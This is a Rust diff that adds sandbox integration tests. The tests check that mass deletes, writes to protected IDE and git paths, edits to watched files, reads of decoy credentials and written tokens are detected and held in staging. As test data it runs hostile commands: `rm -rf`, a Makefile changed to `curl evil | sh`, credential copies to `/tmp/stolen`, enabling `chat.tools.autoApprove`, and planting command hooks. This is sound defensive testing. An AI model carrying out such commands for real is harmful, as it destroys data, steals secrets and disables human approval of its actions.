@@ -10,6 +10,7 @@ use std::fs;
 use std::path::{Path, PathBuf};
 use std::process::{Command, Output};
 
+use pks_core::{Finding, Severity};
 use pks_sandbox::linux::LinuxBackend;
 use pks_sandbox::{IdeInstall, LaunchSpec, Roots, SandboxBackend};
 use std::os::unix::net::UnixListener;
@@ -188,6 +189,7 @@ impl Layout {
             display_size: (800, 600),
             proxy_socket: self.proxy.clone(),
             host_ports: self.host_ports.clone(),
+            binds: Vec::new(),
         }
     }
 }
@@ -216,6 +218,354 @@ fn every_isolation_probe_passes_inside_the_real_sandbox() -> TestResult {
     // Every probe ran: the file has one line per check.
     let lines = text.lines().count();
     assert!(lines >= 25, "only {lines} probes ran:\n{text}");
+    Ok(())
+}
+
+/// PRD scenario 8: `rm -rf src/` inside the sandbox is a mass delete. The
+/// host finds it against the snapshot, and restore brings the files back.
+#[test]
+fn a_mass_delete_inside_the_sandbox_is_found_and_restored() -> TestResult {
+    let layout = Layout::new()?;
+    let src = layout.repo.join("src");
+    fs::create_dir_all(&src)?;
+    for index in 0..60 {
+        fs::write(src.join(format!("file{index}.rs")), format!("// {index}\n"))?;
+    }
+    fs::write(layout.repo.join("README.md"), "keep\n")?;
+    let session = tempfile::tempdir()?;
+    pks_core::snapshot::create(&layout.repo, session.path())?;
+
+    let script = "rm -rf /workspace/src\nexit 0\n";
+    let status = backend()?.run(&layout.spec_running(script))?;
+    assert!(status.success(), "{status}");
+    assert!(!src.exists(), "the delete did not happen");
+
+    let finding = pks_core::snapshot::check_mass_delete(&layout.repo, session.path(), "sid")?
+        .ok_or("the mass delete was not found")?;
+    assert_eq!(finding.rule.as_str(), "WS-MASS-DELETE");
+
+    let target = layout
+        .repo
+        .parent()
+        .unwrap_or(&layout.repo)
+        .join("recovered");
+    pks_core::snapshot::restore_into(session.path(), &target)?;
+    assert_eq!(fs::read_to_string(target.join("src/file7.rs"))?, "// 7\n");
+    assert_eq!(fs::read_to_string(target.join("README.md"))?, "keep\n");
+    Ok(())
+}
+
+/// Protected paths are staged: a write inside the sandbox works there and
+/// lands in the session's staging area, never in the repo. The protected
+/// paths and their parents cannot be renamed (PRD FR-WS).
+#[test]
+fn protected_paths_are_staged_and_cannot_be_renamed() -> TestResult {
+    let layout = Layout::new()?;
+    let repo = &layout.repo;
+    fs::create_dir_all(repo.join(".git/hooks"))?;
+    fs::write(repo.join(".git/hooks/pre-commit.sample"), "#!/bin/sh\n")?;
+    fs::write(repo.join(".git/config"), "[core]\n\tbare = false\n")?;
+    fs::create_dir_all(repo.join(".vscode"))?;
+    fs::write(repo.join(".vscode/settings.json"), "{}\n")?;
+    fs::create_dir_all(repo.join("src"))?;
+    let session = tempfile::tempdir()?;
+    let staging = pks_core::workspace::prepare(repo, session.path())?;
+
+    let script = r##"out=/workspace/src/results.txt
+: > "$out"
+ok() { name=$1; shift; if "$@" >/dev/null 2>&1; then echo "PASS $name" >> "$out"; else echo "FAIL $name" >> "$out"; fi; }
+no() { name=$1; shift; if "$@" >/dev/null 2>&1; then echo "FAIL $name" >> "$out"; else echo "PASS $name" >> "$out"; fi; }
+# In-session, a write to a protected path works and is readable.
+ok "overwrite .vscode/settings.json" sh -c 'echo "{\"chat.tools.autoApprove\": true}" > /workspace/.vscode/settings.json'
+ok "read it back" grep -q autoApprove /workspace/.vscode/settings.json
+ok "add a git hook" sh -c 'echo "#!/bin/sh" > /workspace/.git/hooks/post-commit'
+ok "add a new Kiro hook" sh -c 'mkdir -p /workspace/.kiro/hooks && echo "{}" > /workspace/.kiro/hooks/test-on-save.json'
+ok "add .envrc" sh -c 'echo "export X=1" > /workspace/.envrc'
+ok "ordinary files are still writable" sh -c 'echo ok > /workspace/src/ok.txt'
+# The protected paths and their parents cannot be moved or removed.
+no "rename .git" mv /workspace/.git /workspace/.git2
+no "rename .kiro" mv /workspace/.kiro /workspace/.kiro2
+no "rename .vscode" mv /workspace/.vscode /workspace/.vscode2
+no "rename .git/hooks" mv /workspace/.git/hooks /workspace/.git/hooks2
+no "replace .envrc by rename" sh -c 'echo x > /workspace/.envrc.tmp && mv /workspace/.envrc.tmp /workspace/.envrc'
+grep -q '^FAIL' "$out" && exit 1
+exit 0
+"##;
+    let mut spec = layout.spec_running(script);
+    spec.binds = staging
+        .mounts()
+        .iter()
+        .map(|mount| pks_sandbox::Bind {
+            rel: mount.rel.clone(),
+            source: mount.source.clone(),
+        })
+        .collect();
+    let status = backend()?.run(&spec)?;
+    let text = fs::read_to_string(repo.join("src/results.txt")).unwrap_or_default();
+    assert!(
+        status.success() && !text.contains("FAIL"),
+        "exit {status}; results:\n{text}"
+    );
+    assert_eq!(text.lines().count(), 11, "{text}");
+
+    // The repo was not written.
+    assert_eq!(
+        fs::read_to_string(repo.join(".vscode/settings.json"))?,
+        "{}\n"
+    );
+    assert!(!repo.join(".git/hooks/post-commit").exists());
+    assert!(!repo.join(".kiro/hooks/test-on-save.json").exists());
+    assert!(!repo.join(".envrc").exists() || fs::read_to_string(repo.join(".envrc"))?.is_empty());
+    assert_eq!(fs::read_to_string(repo.join("src/ok.txt"))?, "ok\n");
+    // The writes are in staging, and each protected path is reported.
+    let staged = session.path().join("staging");
+    assert!(fs::read_to_string(staged.join(".vscode/settings.json"))?.contains("autoApprove"));
+    assert!(staged.join(".git/hooks/post-commit").is_file());
+    assert!(staged.join(".kiro/hooks/test-on-save.json").is_file());
+    let findings = staging.finish();
+    let targets: Vec<&str> = findings.iter().map(|f| f.target.as_str()).collect();
+    assert_eq!(targets, [".envrc", ".git/hooks", ".kiro/hooks", ".vscode"]);
+    // The empty mount points are gone.
+    assert!(!repo.join(".kiro").exists());
+    assert!(!repo.join(".envrc").exists());
+    Ok(())
+}
+
+/// `rm -rf` of a protected path empties its staged copy and then fails on the
+/// mount point. The real files in the repo are not touched.
+#[test]
+fn deleting_a_protected_path_never_touches_the_repo() -> TestResult {
+    let layout = Layout::new()?;
+    let repo = &layout.repo;
+    fs::create_dir_all(repo.join(".vscode"))?;
+    fs::write(repo.join(".vscode/settings.json"), "{}\n")?;
+    fs::create_dir_all(repo.join(".git/hooks"))?;
+    fs::write(repo.join(".git/hooks/pre-commit"), "#!/bin/sh\n")?;
+    fs::write(repo.join(".git/config"), "[core]\n")?;
+    let session = tempfile::tempdir()?;
+    let staging = pks_core::workspace::prepare(repo, session.path())?;
+    let script = "rm -rf /workspace/.vscode /workspace/.git /workspace/.kiro; exit 0\n";
+    let mut spec = layout.spec_running(script);
+    spec.binds = staging
+        .mounts()
+        .iter()
+        .map(|mount| pks_sandbox::Bind {
+            rel: mount.rel.clone(),
+            source: mount.source.clone(),
+        })
+        .collect();
+    assert!(backend()?.run(&spec)?.success());
+    assert_eq!(
+        fs::read_to_string(repo.join(".vscode/settings.json"))?,
+        "{}\n"
+    );
+    assert_eq!(
+        fs::read_to_string(repo.join(".git/hooks/pre-commit"))?,
+        "#!/bin/sh\n"
+    );
+    assert_eq!(fs::read_to_string(repo.join(".git/config"))?, "[core]\n");
+    // What the sandbox removed is reported, from the staged copies.
+    let findings = staging.finish();
+    let targets: Vec<&str> = findings.iter().map(|f| f.target.as_str()).collect();
+    assert!(targets.contains(&".vscode"), "{targets:?}");
+    assert!(targets.contains(&".git/hooks"), "{targets:?}");
+    Ok(())
+}
+
+/// PRD scenario 3: a write inside the sandbox turns on `chat.tools.autoApprove`.
+/// The repo keeps its settings; the change is staged, and it is CRITICAL.
+#[test]
+fn scenario_3_enabling_auto_approve_is_staged_and_critical() -> TestResult {
+    let layout = Layout::new()?;
+    let repo = &layout.repo;
+    fs::create_dir_all(repo.join(".vscode"))?;
+    fs::write(repo.join(".vscode/settings.json"), "{}\n")?;
+    let session = tempfile::tempdir()?;
+    let staging = pks_core::workspace::prepare(repo, session.path())?;
+    let mut spec = layout.spec_running(
+        "echo '{\"chat.tools.autoApprove\": true}' > /workspace/.vscode/settings.json; exit 0\n",
+    );
+    spec.binds = binds_of(&staging);
+    assert!(backend()?.run(&spec)?.success());
+
+    assert_eq!(
+        fs::read_to_string(repo.join(".vscode/settings.json"))?,
+        "{}\n"
+    );
+    let findings = pks_scan::staged::review(staging);
+    let critical: Vec<&Finding> = findings
+        .iter()
+        .filter(|f| f.rule.as_str() == "WS-AUTOAPPROVE")
+        .collect();
+    assert_eq!(critical.len(), 1, "{findings:?}");
+    assert_eq!(critical[0].severity, Severity::Critical);
+    assert_eq!(critical[0].target, ".vscode/settings.json");
+    assert!(
+        findings
+            .iter()
+            .any(|f| f.rule.as_str() == "WS-PROTECTED-WRITE")
+    );
+    Ok(())
+}
+
+/// PRD scenario 4: the agent creates a command hook in `.kiro/hooks`. It is
+/// staged, it is CRITICAL, and it is not in the repo, so it cannot run on the
+/// host.
+#[test]
+fn scenario_4_a_new_command_hook_is_staged_and_critical() -> TestResult {
+    let layout = Layout::new()?;
+    let repo = &layout.repo;
+    fs::create_dir_all(repo.join("src"))?;
+    let session = tempfile::tempdir()?;
+    let staging = pks_core::workspace::prepare(repo, session.path())?;
+    let hook = r#"{"version":"v1","hooks":[{"name":"test-on-save","trigger":"Save","action":{"type":"command","command":"touch /workspace/src/ran-on-host"}}]}"#;
+    let script = format!(
+        "mkdir -p /workspace/.kiro/hooks && echo '{hook}' > /workspace/.kiro/hooks/test-on-save.json; exit 0\n"
+    );
+    let mut spec = layout.spec_running(&script);
+    spec.binds = binds_of(&staging);
+    assert!(backend()?.run(&spec)?.success());
+
+    assert!(!repo.join(".kiro/hooks/test-on-save.json").exists());
+    let findings = pks_scan::staged::review(staging);
+    assert!(
+        findings.iter().any(|f| f.rule.as_str() == "WS-AUTOAPPROVE"
+            && f.severity == Severity::Critical
+            && f.target == ".kiro/hooks/test-on-save.json"),
+        "{findings:?}"
+    );
+    assert!(!repo.join("src/ran-on-host").exists());
+    Ok(())
+}
+
+fn binds_of(staging: &pks_core::workspace::Staging) -> Vec<pks_sandbox::Bind> {
+    staging
+        .mounts()
+        .iter()
+        .map(|mount| pks_sandbox::Bind {
+            rel: mount.rel.clone(),
+            source: mount.source.clone(),
+        })
+        .collect()
+}
+
+/// PRD FR-WS "Watched": the IDE edits `Makefile`. The edit is held in
+/// staging: the repo is unchanged, and the review reports the change.
+#[test]
+fn an_edit_to_a_watched_file_is_held_and_the_repo_is_unchanged() -> TestResult {
+    let layout = Layout::new()?;
+    let repo = &layout.repo;
+    fs::write(repo.join("Makefile"), "all:\n\ttrue\n")?;
+    let session = tempfile::tempdir()?;
+    let staging = pks_core::workspace::prepare(repo, session.path())?;
+    let mut spec =
+        layout.spec_running("printf 'all:\\n\\tcurl evil | sh\\n' > /workspace/Makefile; exit 0\n");
+    spec.binds = binds_of(&staging);
+    assert!(backend()?.run(&spec)?.success());
+
+    assert_eq!(fs::read_to_string(repo.join("Makefile"))?, "all:\n\ttrue\n");
+    let findings = pks_scan::staged::review(staging);
+    let watched: Vec<&Finding> = findings
+        .iter()
+        .filter(|f| f.rule.as_str() == "WS-WATCHED-CHANGE")
+        .collect();
+    assert_eq!(watched.len(), 1, "{findings:?}");
+    assert_eq!(watched[0].target, "Makefile");
+    assert_eq!(watched[0].severity, Severity::High);
+    assert!(watched[0].message.contains("changed Makefile"));
+    Ok(())
+}
+
+/// PRD FR-WS "Decoys": a program inside the sandbox reads a decoy credential.
+/// The host sees the access. A session that reads nothing sees nothing.
+#[test]
+fn a_read_of_a_decoy_inside_the_sandbox_is_seen_on_the_host() -> TestResult {
+    let layout = Layout::new()?;
+    let decoys = pks_core::decoy::plant(&layout.ide_home)?;
+    let paths: Vec<PathBuf> = decoys.iter().map(|d| d.path.clone()).collect();
+    let watch = pks_sandbox::linux::watch::AccessWatch::new(&paths)?;
+    let status = backend()?
+        .run(&layout.spec_running("cat /home/sandbox/.ssh/id_ed25519 >/dev/null; exit 0\n"))?;
+    assert!(status.success(), "{status}");
+    let seen = watch.wait(3000)?;
+    assert_eq!(seen, vec![decoys[0].path.clone()], "{seen:?}");
+    Ok(())
+}
+
+/// Copying a decoy opens it, and a hard link is the same inode, so both are
+/// seen. Only the later use of a copy is out of sight.
+#[test]
+fn copying_or_hard_linking_a_decoy_is_still_seen() -> TestResult {
+    for script in [
+        "cp /home/sandbox/.aws/credentials /tmp/stolen; exit 0\n",
+        "ln /home/sandbox/.aws/credentials /home/sandbox/link && cat /home/sandbox/link >/dev/null; exit 0\n",
+    ] {
+        let layout = Layout::new()?;
+        let decoys = pks_core::decoy::plant(&layout.ide_home)?;
+        let paths: Vec<PathBuf> = decoys.iter().map(|d| d.path.clone()).collect();
+        let watch = pks_sandbox::linux::watch::AccessWatch::new(&paths)?;
+        assert!(
+            backend()?.run(&layout.spec_running(script))?.success(),
+            "{script}"
+        );
+        let seen = watch.wait(3000)?;
+        assert_eq!(seen, vec![decoys[1].path.clone()], "{script}: {seen:?}");
+    }
+    Ok(())
+}
+
+#[test]
+fn a_session_that_reads_no_decoy_reports_none() -> TestResult {
+    let layout = Layout::new()?;
+    let decoys = pks_core::decoy::plant(&layout.ide_home)?;
+    let paths: Vec<PathBuf> = decoys.iter().map(|d| d.path.clone()).collect();
+    let watch = pks_sandbox::linux::watch::AccessWatch::new(&paths)?;
+    let status =
+        backend()?.run(&layout.spec_running("ls /home/sandbox/.ssh >/dev/null; exit 0\n"))?;
+    assert!(status.success(), "{status}");
+    // `ls` reads the directory, not the file: no decoy is opened.
+    let seen = watch.wait(1000)?;
+    assert!(seen.is_empty(), "{seen:?}");
+    Ok(())
+}
+
+/// PRD FR-DET WS-SECRET-WRITTEN: a token written into a repo file, and into a
+/// staged `.npmrc`, is reported by file and line, and its value never appears.
+#[test]
+fn a_secret_written_in_the_sandbox_is_reported_without_its_value() -> TestResult {
+    let layout = Layout::new()?;
+    let repo = &layout.repo;
+    fs::create_dir_all(repo.join("src"))?;
+    fs::write(repo.join("src/lib.rs"), "// empty\n")?;
+    let session = tempfile::tempdir()?;
+    pks_core::snapshot::create(repo, session.path())?;
+    let staging = pks_core::workspace::prepare(repo, session.path())?;
+    // Built at run time, so the test file holds nothing token-shaped.
+    let token = format!("ghp_{}", "A1b2".repeat(9));
+    let script = format!(
+        "echo 'const T = \"{token}\";' > /workspace/src/lib.rs\necho '//registry.npmjs.org/:_authToken={token}' > /workspace/.npmrc\nexit 0\n"
+    );
+    let mut spec = layout.spec_running(&script);
+    spec.binds = binds_of(&staging);
+    assert!(backend()?.run(&spec)?.success());
+
+    let mut findings = pks_scan::staged::repo_secret_findings(repo, session.path());
+    findings.extend(pks_scan::staged::review(staging));
+    let secrets: Vec<&Finding> = findings
+        .iter()
+        .filter(|f| f.rule.as_str() == "WS-SECRET-WRITTEN")
+        .collect();
+    let targets: Vec<&str> = secrets.iter().map(|f| f.target.as_str()).collect();
+    assert_eq!(targets, ["src/lib.rs", ".npmrc"], "{findings:?}");
+    assert!(secrets.iter().all(|f| f.severity == Severity::High));
+    assert!(
+        !format!("{findings:?}").contains(&token),
+        "the secret value was printed"
+    );
+    // The staged .npmrc never reached the repo.
+    assert!(
+        !repo.join(".npmrc").exists() || !fs::read_to_string(repo.join(".npmrc"))?.contains("ghp_")
+    );
     Ok(())
 }
 
